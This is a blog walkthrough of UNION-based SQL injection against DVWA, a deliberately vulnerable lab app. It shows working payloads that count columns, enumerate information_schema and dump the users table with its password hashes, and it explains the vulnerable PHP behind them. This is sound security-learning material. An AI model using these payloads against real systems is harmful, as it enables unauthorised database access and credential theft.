---
layout: post
title: "UNION SELECT: from a working bypass to a full credential dump"
date: 2026-05-26
categories: [web-security, walkthrough]
tags: [sqli, dvwa, union-attack, mariadb, information_schema]
excerpt: "The bypass from last time was just a door. UNION SELECT is what you do once you're inside — and it turns out the database will tell you almost everything if you ask in the right order."
---

Last time I got five usernames on screen by injecting `' OR 1=1-- +` and felt unreasonably proud of myself. Then I read what I'd actually done: bypassed a WHERE clause. I hadn't read anything I wasn't supposed to read. I'd just made the query return everything instead of one row.

That's not a data breach. That's a warm-up.

The real move is `UNION SELECT` — using the injection point to attach a second query and pull out arbitrary data from arbitrary tables. This is the post about learning how to do that, step by step, on DVWA Low. Including the moment where I tried to union three columns onto a two-column query and got a different error than expected, and had to stop and think about why.

## Where we are

Same setup as last time: DVWA in Docker, security level Low, the SQL Injection module. The vulnerable parameter is `id` in a GET request. The underlying query is:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Two columns. Direct concatenation. No defenses. We already know injection works — now we want to use it to read data.

## Step 1: how many columns does the query return?

Before you can UNION anything, you need to know the column count of the original query. A UNION requires both SELECT statements to return the same number of columns — otherwise the database refuses to combine them.

The method: `ORDER BY` with an incrementing number. `ORDER BY 1` means "order by the first column", `ORDER BY 2` by the second, and so on. When you go past the last column, you get an error.

```
?id=1'+ORDER+BY+1--+    → 200, normal output
?id=1'+ORDER+BY+2--+    → 200, normal output
?id=1'+ORDER+BY+3--+    → error
```

The error on `ORDER BY 3`:

```
Unknown column '3' in 'order clause'
```

Two columns. Confirmed.

Then I tried to verify with `UNION SELECT NULL,NULL,NULL` — three NULLs, just to be sure — and got a different error:

```
The used SELECT statements have a different number of columns
```

Two different errors, but the same information. The first comes from the `ORDER BY` parser; the second from the UNION logic. They're telling you the same thing from two different places in the database engine. Once you've seen both, you stop confusing them.

## Step 2: which columns accept strings?

A UNION column can only carry data of a compatible type. If the original query has an integer column, you can't pour a string into it — the database will complain.

On MariaDB this is rarely a problem in practice, because MariaDB is fairly permissive about type coercion. But the correct move is to test explicitly. Replace each NULL with a string literal and see what happens:

```
?id='+UNION+SELECT+'a','a'--+
```

Response:

```
First name: a
Surname: a
```

Both columns accept strings. Both columns are reflected in the page output. This means I can use both to exfiltrate text data — I'm not limited to one.

## Step 3: enumerate the database with information_schema

This is where it gets interesting. MariaDB (and MySQL) ships with a built-in database called `information_schema` — a read-only catalogue of every database, table, and column on the server. It's always there. It's always readable. And with an injection point that lets you run arbitrary SELECT statements, it's basically a map of everything the database knows about itself.

**First: what database are we in?**

```
?id='+UNION+SELECT+database(),version()--+
```

```
First name: dvwa
Surname: 10.1.26-MariaDB-0+deb9u1
```

Database: `dvwa`. MariaDB 10.1.26 on Debian 9. Good to know — different MariaDB versions have slightly different built-in functions and behaviors.

**Second: what tables are in this database?**

```
?id='+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--+
```

```
First name: guestbook
First name: users
```

Two tables. `users` is the one we want.

**Third: what columns does `users` have?**

```
?id='+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--+
```

```
user_id, first_name, last_name, user, password, avatar, last_login, failed_login
```

There it is. A column called `password`, sitting next to a column called `user`. At this point the next query writes itself.

## Step 4: pull the credentials

```
?id='+UNION+SELECT+user,password+FROM+users--+
```

```
First name: admin      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb    Surname: e99a18c428cb38d5f260853678922e03
First name: 1337       Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo      Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy     Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Five users. Five MD5 hashes. And `admin` and `smithy` have the same hash — same password. These are DVWA's well-known intentionally weak credentials, crackable in seconds on any rainbow table, but that's not the point. The point is that I went from a form field that expected a user ID integer to a full dump of the credentials table in four queries.

I said something out loud to an empty room. I'm not going to tell you what.

## Why the code makes this trivially easy

DVWA has a "View Source" button that shows the PHP behind the vulnerability. The Low level code:

```php
$id = $_REQUEST[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query)
    or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

while( $row = mysqli_fetch_assoc( $result ) ) {
    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
}
```

Three things that made this session easy instead of hard:

**1. Direct concatenation.** `$id` goes straight into the query string. No escaping, no type check, no validation. The field expects an integer — a single `intval($id)` would have killed every injection in this post before it started.

**2. `die()` with `mysqli_error()`.** Every time a payload broke the query syntax, the database error printed directly to the page. This isn't just a vulnerability — it's a debugging service for the attacker. Every wrong payload came with a free explanation of why it was wrong.

**3. `while` loop over all results.** The code prints every row the query returns. With `UNION SELECT`, I added rows to the result — and the loop printed them all, obediently, without any concept of "wait, why are there five results for a query that should return one."

These three things together turn a theoretical vulnerability into a trivial one. Remove any one of them and this session gets harder. Remove all three and you have the Impossible level.

## The pattern behind all of this

The UNION attack has a fixed sequence that doesn't really change across targets:

1. Find the column count (`ORDER BY`)
2. Find which columns are string-compatible and visible in the output
3. Use `information_schema` to map the database: schema → tables → columns
4. Query the columns you want

Step 3 is the one that surprised me the most when I first read about it. The idea that the database comes with a built-in catalogue of itself — and that the same injection that lets you read `users` also lets you read `information_schema.tables` — means you don't need to guess table names. You just ask.

## What comes next

The entire session above relied on one thing: error messages and output being visible in the page. Every step I could see what worked and what didn't. That's called **error-based** and **union-based** injection — the comfortable kind, where the database talks back.

The next level is **Blind SQL Injection**, where none of that is available. No errors, no output, just a page that says "user exists" or "user doesn't exist." You extract data one bit at a time, asking yes/no questions to the database. It's slower, it's more methodical, and it's where `sqlmap` starts to feel less like cheating and more like a necessity — though I'll do it by hand first, at least once.

## Takeaways

- **The column count comes first, always.** `ORDER BY` is the cleanest way. The two different errors (ORDER BY vs UNION) tell you the same thing — once you've seen both you stop being confused by them.
- **`information_schema` is the skeleton key.** You don't need to know table names in advance. The database tells you, if you ask with the right query.
- **Verbose errors are a gift to the attacker.** `mysqli_error()` in a `die()` call isn't just bad practice — it's active assistance. Suppressing errors doesn't fix the injection, but it makes exploitation significantly harder.
- **The UNION attack has a fixed sequence.** Columns → types → schema → data. Internalizing the order means you're not thinking about methodology during a session, you're just executing it.

## Useful references

- [PortSwigger — UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [MySQL/MariaDB — information_schema.tables](https://mariadb.com/kb/en/information-schema-tables-table/)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

*All techniques shown were performed on an isolated lab environment running in Docker on my local machine. Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
